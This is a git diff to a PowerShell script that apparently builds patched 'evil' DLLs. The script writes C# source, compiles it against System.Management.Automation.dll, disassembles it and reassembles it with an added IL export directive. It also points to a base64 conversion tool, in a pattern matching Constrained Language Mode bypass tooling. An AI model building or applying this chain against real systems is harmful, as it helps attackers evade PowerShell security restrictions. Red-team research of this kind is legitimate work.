@@ -104,7 +104,6 @@ Process{
 	    }
     }
 }
-
 }
 
 function Invoke-FileCreate {
@@ -117,21 +116,21 @@ function Invoke-FileCreate {
 	Write-Host $global:fin2
     $global:srcfile = $global:DllName + ".cs"
     $global:fin2 | Out-File $global:srcfile
-    dllmove
+    Invoke-DllMove
 }
 
-function dllmove{
+function Invoke-DllMove{
     copy "C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0\System.Management.Automation.dll" .\System.Management.Automation.dll 
-    compile
+    Invoke-Compile
 }
 
-function compile{
+function Invoke-Compile{
      & $global:cscpath /platform:anycpu /reference:System.Management.Automation.dll /target:library /unsafe $global:srcfile #evildll.cs
      del $global:srcfile 
-     toil
+     Invoke-ToIl
 }
 
-function toil{
+function Invoke-ToIl{
     $global:patchilname = "patched_" + $global:DllName + ".il" #patched_evildll.il
     $global:patchdllname = "patched_" + $global:DllName + ".dll" #patched_evildll.dll
     $global:todel = "patched_" + $global:DllName + ".res"
@@ -143,13 +142,23 @@ function toil{
     if ($Build)
     {
         Write-Host "build"
+        Invoke-EditExport
+        Invoke-Recompile
     }
     else{
-        Write-Host "No build"
+        Invoke-EditExport
+        Write-Host "Convert to base64 using https://github.com/FortyNorthSecurity/CLM-Base64 "
+        Write-Host "ipmo .\CLM-Base64.ps1; ConvertTo-Base64 -FilePath C:\pwd\evil.il | clip"
     }
 
 }
 
-function recompile{
+
+function Invoke-EditExport{
+    (gc $global:patchilname) -replace ".maxstack  2", ".export [1]`n`t$&" | sc $global:patchilname
+
+}
+
+function Invoke-Recompile{
     & $global:ildasm $global:patchilname /DLL /output=$global:patchdllname
 }
